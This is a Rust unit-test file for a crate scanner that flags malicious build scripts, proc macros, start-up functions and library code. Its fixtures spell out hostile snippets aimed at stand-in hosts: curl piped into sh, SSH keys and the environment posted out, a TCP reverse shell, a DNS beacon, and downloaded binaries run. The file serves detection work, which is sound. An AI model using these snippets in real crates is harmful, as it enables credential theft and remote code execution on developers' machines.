//! The Rust reader, unit by unit: each test exercises one capability on a minimal fragment.
//!
//! The fragments are not copies of any real sample. Where one needs an address it uses a documentation
//! range (203.0.113.0/24) or a `.invalid` host, and nothing here is ever built or run.

use super::*;

fn u32s(s: &str) -> Vec<u32> {
    s.chars().map(|c| c as u32).collect()
}

fn st(v: &[u32]) -> String {
    v.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect()
}

fn read(files: &[(&str, &str)], opts: Options) -> Answer {
    let texts: Vec<Vec<u32>> = files.iter().map(|(_, t)| u32s(t)).collect();
    let input: Vec<(PyStr, &[u32])> = files.iter().zip(texts.iter()).map(|((p, _), t)| (u32s(p), t.as_slice())).collect();
    let pack = crate::pack::current();
    read_crate(&pack, &input, &opts)
}

fn build_opts() -> Options {
    Options { build: Some(u32s("build.rs")), ..Options::default() }
}

fn rs(f: &Option<Found>) -> Vec<String> {
    f.as_ref().map(|f| f.reasons.iter().map(|r| st(r)).collect()).unwrap_or_default()
}

fn has(rs: &[String], part: &str) -> bool {
    rs.iter().any(|r| r.contains(part))
}

/// Every reason the answer holds, across the build script, the macros, the start-up functions and the rest.
fn all(a: &Answer) -> Vec<String> {
    a.build.iter().chain(&a.macros).chain(&a.start).chain(&a.uses).flat_map(|f| f.reasons.iter().map(|r| st(r))).collect()
}

/// A build script that runs the one statement in `main`.
fn build(stmt: &str) -> Answer {
    let src = format!("use std::process::Command;\nfn main() {{\n    {}\n}}\n", stmt);
    read(&[("build.rs", &src), ("src/lib.rs", "pub fn f() {}\n")], build_opts())
}

#[test]
fn a_build_script_with_no_risk_is_clean() {
    // what build scripts do: read env, write to OUT_DIR, print cargo directives
    let src = r#"
use std::env;
use std::fs;
fn main() {
    let out = env::var("OUT_DIR").unwrap();
    fs::write(format!("{}/gen.rs", out), "pub const N: u8 = 1;").unwrap();
    println!("cargo:rerun-if-changed=build.rs");
    let _ = std::process::Command::new("protoc").arg("--version").output();
}
"#;
    let a = read(&[("build.rs", src), ("src/lib.rs", LIB)], build_opts());
    assert_eq!(a.build, None, "a plain build script");
    assert!(a.read.len() >= 2);
}

const LIB: &str = "pub fn f() -> u8 { 1 }\n";

#[test]
fn a_command_that_pipes_a_download_into_a_shell() {
    let a = build(r#"Command::new("sh").arg("-c").arg("curl -s https://example.invalid/s | sh").status().unwrap();"#);
    assert!(has(&rs(&a.build), "pipes a download into a shell"), "{:?}", rs(&a.build));
}

#[test]
fn a_shell_command_built_from_pieces() {
    // the program and the flag are constants; the URL is concatenated
    let a = build(r#"let url = String::from("https://example.invalid/") + "s.sh"; Command::new("bash").args(["-c", &format!("wget -O - {} | bash", url)]).spawn().unwrap();"#);
    assert!(has(&rs(&a.build), "pipes a download into a shell"), "{:?}", rs(&a.build));
}

#[test]
fn an_address_decoded_from_base64_then_contacted() {
    let a = build(r#"let url = String::from_utf8(base64::engine::general_purpose::STANDARD.decode("aHR0cDovLzIwMy4wLjExMy41L3M=").unwrap()).unwrap(); reqwest::blocking::get(&url).unwrap();"#);
    // 203.0.113.5 is the decoded address
    assert!(has(&rs(&a.build), "203.0.113.5") || has(&rs(&a.build), "an address typical of data exfiltration"), "{:?}", rs(&a.build));
}

#[test]
fn credentials_read_and_sent() {
    let a = build(r#"let k = std::fs::read_to_string(dirs::home_dir().unwrap().join(".ssh/id_rsa")).unwrap(); reqwest::blocking::Client::new().post("https://example.invalid/c").body(k).send().unwrap();"#);
    let r = rs(&a.build);
    // a build script's test is the install test: every reason CRITICAL, so the credential file read and sent is a finding
    assert!(has(&r, "reads files outside the package and sends them") || has(&r, ".ssh"), "{:?}", r);
}

#[test]
fn the_whole_environment_sent() {
    let a = build(r#"let body = std::env::vars().map(|(k, v)| format!("{}={}", k, v)).collect::<Vec<_>>().join("\n"); ureq::post("https://example.invalid/e").send_string(&body).unwrap();"#);
    let r = rs(&a.build);
    assert!(has(&r, "environment") || has(&r, "reads credentials or the whole environment"), "{:?}", r);
}

#[test]
fn a_download_written_to_a_file_then_run() {
    let src = r#"
use std::process::Command;
fn main() {
    let resp = reqwest::blocking::get("https://example.invalid/p").unwrap();
    let bytes = resp.bytes().unwrap();
    std::fs::write("/tmp/p", &bytes).unwrap();
    Command::new("/tmp/p").spawn().unwrap();
}
"#;
    let a = read(&[("build.rs", src), ("src/lib.rs", LIB)], build_opts());
    let r = rs(&a.build);
    assert!(has(&r, "downloads a file and then runs it") || has(&r, "downloads a script and runs it"), "{:?}", r);
}

#[test]
fn a_connection_whose_stdio_is_a_shell() {
    let src = r#"
use std::process::{Command, Stdio};
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
fn main() {
    let s = TcpStream::connect("203.0.113.5:4444").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh").stdin(unsafe { Stdio::from_raw_fd(fd) }).stdout(unsafe { Stdio::from_raw_fd(fd) }).spawn().unwrap();
}
"#;
    let a = read(&[("build.rs", src), ("src/lib.rs", LIB)], build_opts());
    assert!(has(&rs(&a.build), "reverse shell"), "{:?}", rs(&a.build));
}

#[test]
fn a_proc_macro_crate_is_read_as_build_time() {
    // a proc-macro crate's library runs inside the compiler of whoever uses it
    let src = r#"
use proc_macro::TokenStream;
#[proc_macro]
pub fn mac(input: TokenStream) -> TokenStream {
    std::process::Command::new("sh").arg("-c").arg("curl -s https://example.invalid/s | sh").spawn().ok();
    input
}
"#;
    let a = read(&[("src/lib.rs", src)], Options { proc_macro: true, ..Options::default() });
    assert!(has(&rs(&a.macros), "pipes a download into a shell"), "{:?}", rs(&a.macros));
}

#[test]
fn a_ctor_runs_at_start() {
    let src = r#"
#[ctor::ctor]
fn init() {
    std::process::Command::new("sh").arg("-c").arg("curl -s https://example.invalid/s | sh").spawn().ok();
}
pub fn f() {}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    assert_eq!(a.start.len(), 1, "a ctor is a start-up function");
    // the import-time wording for the same behaviour
    assert!(has(&a.start[0].reasons.iter().map(|r| st(r)).collect::<Vec<_>>(), "runs a downloaded script through a shell"));
}

#[test]
fn a_dns_lookup_of_a_name_built_from_the_hostname() {
    // the shape of the Go DNS backdoor, in Rust: the host name in a name looked up
    let src = r#"
use trust_dns_resolver::Resolver;
pub fn beacon() {
    let h = hostname::get().unwrap().into_string().unwrap();
    let r = Resolver::from_system_conf().unwrap();
    let _ = r.txt_lookup(format!("{}.c.example.invalid", h));
}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(has(&r, "DNS lookup of a name it builds"), "{:?}", r);
}

#[test]
fn use_time_code_only_counts_what_it_reached() {
    // a payload in a method the crate runs only when used: SC-USE-RISK reads it
    let src = r#"
pub struct Logger;
impl Logger {
    pub fn new() -> Self { Logger }
    pub fn flush(&self) {
        let env = std::env::vars().map(|(k, v)| format!("{}={}", k, v)).collect::<Vec<_>>().join("\n");
        reqwest::blocking::Client::new().post("https://example.invalid/c").body(env).send().ok();
    }
}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    assert!(a.build.is_none() && a.start.is_empty());
    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(!r.is_empty(), "the logger's payload is read when used");
    assert!(a.use_read.files >= 1);
}

#[test]
fn tests_and_examples_are_not_read() {
    let a = read(
        &[
            ("src/lib.rs", LIB),
            ("tests/it.rs", r#"fn main() { std::process::Command::new("sh").arg("-c").arg("curl https://example.invalid | sh").status().ok(); }"#),
            ("examples/e.rs", r#"fn main() { reqwest::blocking::get("https://example.invalid/e").ok(); }"#),
        ],
        Options::default(),
    );
    // the files are classified but not read for what their code does
    let paths = ["src/lib.rs"];
    assert_eq!(a.read.len(), paths.len(), "only src/lib.rs is a built file");
    assert!(a.uses.is_empty() && a.build.is_none());
}

#[test]
fn a_cfg_test_module_is_left_out() {
    let src = r#"
pub fn f() -> u8 { 1 }
#[cfg(test)]
mod tests {
    pub fn helper() {
        std::process::Command::new("sh").arg("-c").arg("curl https://example.invalid | sh").status().ok();
    }
}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(r.is_empty(), "code under cfg(test) is not read: {:?}", r);
}

#[test]
fn a_followed_function_in_another_module() {
    let lib = "mod net;\npub fn run() { net::send(std::env::vars().map(|(k, v)| format!(\"{}={}\", k, v)).collect::<Vec<_>>().join(\"\\n\")); }\n";
    let net = "pub fn send(s: String) { reqwest::blocking::Client::new().post(\"https://example.invalid/c\").body(s).send().ok(); }\n";
    let a = read(&[("src/lib.rs", lib), ("src/net.rs", net)], Options::default());
    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(!r.is_empty(), "the token's flow crosses the module boundary: {:?}", r);
}

#[test]
fn a_library_loaded_from_a_written_file() {
    let src = r#"
pub fn load() {
    let b = reqwest::blocking::get("https://example.invalid/x.so").unwrap().bytes().unwrap();
    std::fs::write("/tmp/x.so", &b).unwrap();
    unsafe { libloading::Library::new("/tmp/x.so").unwrap(); }
}
"#;
    let a = read(&[("src/lib.rs", src)], Options::default());
    let r: Vec<String> = a.uses.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect();
    assert!(has(&r, "downloads") || has(&r, "runs"), "a downloaded library is loaded: {:?}", r);
}

#[test]
fn an_empty_or_unparsable_crate_is_clean_and_does_not_panic() {
    let a = read(&[("src/lib.rs", "")], Options::default());
    assert_eq!(a.build, None);
    let a = read(&[("src/lib.rs", "fn f( { let x = ] ; } struct")], Options::default());
    assert!(a.build.is_none());
    // a deeply nested body is read without overflowing the stack
    let deep = format!("pub fn f() {{ {}{} }}", "if true { ".repeat(4000), "}".repeat(4000));
    let _ = read(&[("src/lib.rs", &deep)], Options::default());
}
